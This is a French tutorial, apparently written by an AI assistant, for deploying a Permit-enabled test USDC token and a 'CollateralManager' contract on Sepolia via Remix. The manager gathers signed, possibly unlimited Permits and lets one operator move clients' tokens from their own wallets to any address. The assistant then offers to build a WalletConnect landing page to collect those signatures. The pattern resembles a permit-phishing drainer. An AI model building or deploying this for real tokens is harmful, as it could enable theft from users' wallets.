# 🎯 Guide Pas à Pas - Déploiement sur Remix

## 📱 ÉTAPE 1 : Installer et configurer MetaMask (5 minutes)

### 1.1 Installer MetaMask
1. Allez sur : **https://metamask.io/**
2. Cliquez sur **"Download"**
3. Installez l'extension pour votre navigateur (Chrome, Firefox, etc.)
4. Ouvrez MetaMask et créez un wallet (ou importez-en un existant)
5. **Notez votre phrase secrète** (seed phrase) dans un endroit sûr !

### 1.2 Ajouter le réseau Sepolia
1. Ouvrez MetaMask (cliquez sur l'icône du renard en haut à droite)
2. En haut, cliquez sur le menu déroulant des réseaux (par défaut "Ethereum Mainnet")
3. Cliquez sur **"Show test networks"** dans les paramètres si vous ne voyez pas Sepolia
4. Sélectionnez **"Sepolia test network"**

### 1.3 Obtenir de l'ETH Sepolia GRATUIT
Vous avez besoin d'ETH pour payer les frais de transaction (gas).

**Option A : Alchemy Faucet (Rapide)**
1. Allez sur : **https://sepoliafaucet.com/**
2. Créez un compte Alchemy (gratuit)
3. Collez votre adresse MetaMask
4. Cliquez **"Send Me ETH"**
5. ✅ Vous recevrez 0.5 ETH Sepolia en quelques secondes

**Option B : PoW Faucet (Sans compte)**
1. Allez sur : **https://sepolia-faucet.pk910.de/**
2. Collez votre adresse MetaMask
3. Résolvez le captcha
4. ✅ Vous recevrez de l'ETH après quelques minutes

**Vérification :**
- Ouvrez MetaMask
- Vérifiez que vous voyez un solde (ex: 0.5 ETH)
- ✅ Si oui, passez à l'étape suivante !

---

## 💻 ÉTAPE 2 : Préparer Remix IDE (3 minutes)

### 2.1 Ouvrir Remix
1. Allez sur : **https://remix.ethereum.org/**
2. Attendez que la page charge complètement
3. Vous verrez l'interface Remix avec plusieurs onglets à gauche

### 2.2 Créer les fichiers des contrats

#### A. Créer le fichier TestUSDC.sol

1. Dans la barre latérale gauche, cliquez sur l'icône **"File Explorer"** (première icône, ressemble à des fichiers)
2. Cliquez sur l'icône **"+"** (Create New File) sous "contracts"
3. Nommez le fichier : **TestUSDC.sol**
4. Appuyez sur Entrée

5. **Copiez ce code complet dans le fichier :**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Permit.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

/**
 * @title TestUSDC
 * @dev Token ERC-20 avec fonction Permit (EIP-2612) pour tests sur Sepolia
 * Simule USDC avec la fonctionnalité Permit native
 */
contract TestUSDC is ERC20, ERC20Permit, Ownable {
    uint8 private _decimals;

    constructor(
        string memory name,
        string memory symbol,
        uint256 initialSupply
    ) ERC20(name, symbol) ERC20Permit(name) Ownable(msg.sender) {
        _decimals = 6; // USDC utilise 6 décimales
        _mint(msg.sender, initialSupply * 10**_decimals);
    }

    /**
     * @dev Permet au owner de créer des tokens supplémentaires
     */
    function mint(address to, uint256 amount) public onlyOwner {
        _mint(to, amount * 10**_decimals);
    }

    /**
     * @dev Override pour utiliser 6 décimales comme USDC
     */
    function decimals() public view virtual override returns (uint8) {
        return _decimals;
    }
}
```

6. Appuyez sur **Ctrl+S** (ou Cmd+S sur Mac) pour sauvegarder
7. ✅ Le fichier TestUSDC.sol est créé !

#### B. Créer le fichier CollateralManager.sol

1. Cliquez à nouveau sur **"+"** pour créer un nouveau fichier
2. Nommez-le : **CollateralManager.sol**
3. Appuyez sur Entrée

4. **Copiez ce code complet dans le fichier :**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/IERC20Permit.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";

/**
 * @title CollateralManager
 * @dev Gère les collatéraux pour un système de prêt crypto
 * Permet aux clients de signer un Permit pour autoriser le retrait de collatéraux
 */
contract CollateralManager is Ownable, ReentrancyGuard {
    IERC20Permit public immutable token;
    address public operator;

    // Mapping pour suivre les clients enregistrés
    mapping(address => bool) public registeredClients;
    mapping(address => uint256) public clientAllowance;

    // Events
    event ClientRegistered(address indexed client, uint256 allowance, uint256 timestamp);
    event CollateralWithdrawn(address indexed client, address indexed to, uint256 amount, string reason);
    event OperatorChanged(address indexed oldOperator, address indexed newOperator);

    modifier onlyOperator() {
        require(msg.sender == operator, "Only operator can call this");
        _;
    }

    constructor(address _token) Ownable(msg.sender) {
        require(_token != address(0), "Invalid token address");
        token = IERC20Permit(_token);
        operator = msg.sender;
    }

    /**
     * @dev Change l'adresse de l'opérateur autorisé à retirer les collatéraux
     */
    function setOperator(address _operator) external onlyOwner {
        require(_operator != address(0), "Invalid operator address");
        address oldOperator = operator;
        operator = _operator;
        emit OperatorChanged(oldOperator, _operator);
    }

    /**
     * @dev Enregistre un client avec un Permit signé
     * @param owner Adresse du client (propriétaire des tokens)
     * @param value Montant autorisé (peut être type(uint256).max pour illimité)
     * @param deadline Timestamp d'expiration du permit
     * @param v, r, s Composants de la signature EIP-712
     */
    function registerClientWithPermit(
        address owner,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external nonReentrant {
        require(owner != address(0), "Invalid owner address");
        
        // Appel de la fonction permit du token ERC-20
        token.permit(owner, address(this), value, deadline, v, r, s);
        
        // Enregistrement du client
        registeredClients[owner] = true;
        clientAllowance[owner] = value;
        
        emit ClientRegistered(owner, value, block.timestamp);
    }

    /**
     * @dev Permet à l'opérateur de retirer les collatéraux d'un client
     * @param client Adresse du client
     * @param to Adresse de destination des fonds
     * @param amount Montant à retirer
     * @param reason Raison du retrait (ex: "Non-paiement prêt #123")
     */
    function withdrawCollateral(
        address client,
        address to,
        uint256 amount,
        string calldata reason
    ) external onlyOperator nonReentrant {
        require(registeredClients[client], "Client not registered");
        require(to != address(0), "Invalid destination address");
        require(amount > 0, "Amount must be greater than 0");
        
        // Vérifier l'allowance actuelle
        uint256 currentAllowance = token.allowance(client, address(this));
        require(currentAllowance >= amount, "Insufficient allowance");
        
        // Vérifier le solde du client
        uint256 clientBalance = token.balanceOf(client);
        require(clientBalance >= amount, "Insufficient client balance");
        
        // Retrait des fonds
        bool success = token.transferFrom(client, to, amount);
        require(success, "Transfer failed");
        
        emit CollateralWithdrawn(client, to, amount, reason);
    }

    /**
     * @dev Vérifie l'allowance actuelle d'un client
     */
    function getClientAllowance(address client) external view returns (uint256) {
        return token.allowance(client, address(this));
    }

    /**
     * @dev Vérifie le solde d'un client
     */
    function getClientBalance(address client) external view returns (uint256) {
        return token.balanceOf(client);
    }

    /**
     * @dev Vérifie si un client est enregistré
     */
    function isClientRegistered(address client) external view returns (bool) {
        return registeredClients[client];
    }
}
```

5. Appuyez sur **Ctrl+S** pour sauvegarder
6. ✅ Le fichier CollateralManager.sol est créé !

---

## 🔨 ÉTAPE 3 : Compiler les contrats (2 minutes)

### 3.1 Ouvrir le compilateur
1. Dans la barre latérale gauche, cliquez sur l'icône **"Solidity Compiler"** (3ème icône, ressemble à un "S")

### 3.2 Configurer le compilateur
1. **Compiler version** : Sélectionnez **0.8.20** ou supérieur (ex: 0.8.27)
2. Cochez **"Auto compile"** (optionnel, mais pratique)
3. **EVM Version** : Laissez par défaut

### 3.3 Compiler TestUSDC
1. Cliquez sur le fichier **TestUSDC.sol** dans le File Explorer
2. Cliquez sur le bouton bleu **"Compile TestUSDC.sol"**
3. Attendez quelques secondes
4. ✅ Vous devriez voir une coche verte si la compilation réussit
5. ❌ Si erreur : Vérifiez la version du compilateur (doit être ≥ 0.8.20)

### 3.4 Compiler CollateralManager
1. Cliquez sur le fichier **CollateralManager.sol**
2. Cliquez sur **"Compile CollateralManager.sol"**
3. ✅ Coche verte = succès !

---

## 🚀 ÉTAPE 4 : Déployer TestUSDC sur Sepolia (5 minutes)

### 4.1 Ouvrir l'onglet de déploiement
1. Dans la barre latérale gauche, cliquez sur **"Deploy & Run Transactions"** (4ème icône, ressemble à Ethereum)

### 4.2 Configurer l'environnement
1. **ENVIRONMENT** : Sélectionnez **"Injected Provider - MetaMask"**
2. MetaMask va s'ouvrir automatiquement
3. Cliquez sur **"Next"** puis **"Connect"** pour connecter MetaMask à Remix
4. ✅ Vérifiez que vous voyez :
   - **Environment** : Injected Provider - MetaMask
   - **Account** : Votre adresse (commence par 0x...)
   - **Balance** : Votre solde ETH Sepolia

### 4.3 Déployer TestUSDC
1. Dans **CONTRACT**, sélectionnez **TestUSDC** dans le menu déroulant
2. Vous verrez apparaître les paramètres du constructeur :

   **Remplissez les champs comme ceci :**
   ```
   NAME: "Test USDC"
   SYMBOL: "TUSDC"  
   INITIALSUPPLY: 1000000
   ```
   
   ⚠️ **Important** : Mettez les guillemets pour les strings !
   
3. Cliquez sur le bouton orange **"Deploy"**
4. MetaMask va s'ouvrir → Vérifiez les détails
5. Cliquez sur **"Confirm"** dans MetaMask
6. Attendez quelques secondes (10-30 secondes)
7. ✅ Le contrat apparaît dans **"Deployed Contracts"** en bas

### 4.4 Noter l'adresse du TestUSDC
1. Dans "Deployed Contracts", vous voyez **TESTUSDC AT 0x123...**
2. Cliquez sur l'icône **"Copy"** à côté de l'adresse
3. **COLLEZ CETTE ADRESSE DANS UN BLOC-NOTES** → Vous en aurez besoin !

   Exemple : `0x1234567890abcdef1234567890abcdef12345678`

---

## 🎯 ÉTAPE 5 : Déployer CollateralManager (3 minutes)

### 5.1 Sélectionner le contrat
1. Dans **CONTRACT**, changez pour **CollateralManager**
2. Vous verrez le paramètre du constructeur : **_TOKEN**

### 5.2 Remplir le paramètre
1. Dans le champ **_TOKEN**, collez **l'adresse du TestUSDC** que vous avez notée
   
   Exemple : `0x1234567890abcdef1234567890abcdef12345678`
   
   ⚠️ **PAS de guillemets** pour les adresses !

### 5.3 Déployer
1. Cliquez sur **"Deploy"**
2. Confirmez dans MetaMask
3. Attendez la confirmation
4. ✅ Le contrat **COLLATERALMANAGER** apparaît dans "Deployed Contracts"

### 5.4 Noter l'adresse du CollateralManager
1. Copiez l'adresse du **COLLATERALMANAGER AT 0x456...**
2. **NOTEZ-LA** dans votre bloc-notes

---

## ✅ ÉTAPE 6 : Vérifier que tout fonctionne (2 minutes)

### 6.1 Vérifier TestUSDC
1. Dans "Deployed Contracts", développez **TESTUSDC**
2. Cliquez sur **"name"** (bouton bleu) → Devrait afficher "Test USDC"
3. Cliquez sur **"symbol"** → Devrait afficher "TUSDC"
4. Cliquez sur **"totalSupply"** → Devrait afficher un grand nombre
5. ✅ Si tout s'affiche correctement, c'est bon !

### 6.2 Vérifier CollateralManager
1. Développez **COLLATERALMANAGER**
2. Cliquez sur **"operator"** → Devrait afficher votre adresse
3. Cliquez sur **"token"** → Devrait afficher l'adresse du TestUSDC
4. ✅ Parfait !

---

## 🎊 FÉLICITATIONS !

Vous avez déployé avec succès :
- ✅ Le token TestUSDC avec fonction Permit
- ✅ Le CollateralManager pour gérer les collatéraux

---

## 📝 Récapitulatif de vos adresses

**Copiez ces informations dans un fichier texte :**

```
Réseau : Sepolia Testnet
Votre adresse wallet : 0x...
TestUSDC : 0x...
CollateralManager : 0x...
```

---

## ➡️ PROCHAINE ÉTAPE

Maintenant que les contrats sont déployés, voulez-vous :

**Option A** : Je vous guide pour tester le système manuellement (mint des tokens, signer un Permit, etc.)

**Option B** : Je crée directement la landing page avec WalletConnect pour automatiser tout ça

**Dites-moi quelle option vous préférez et je continue ! 🚀**
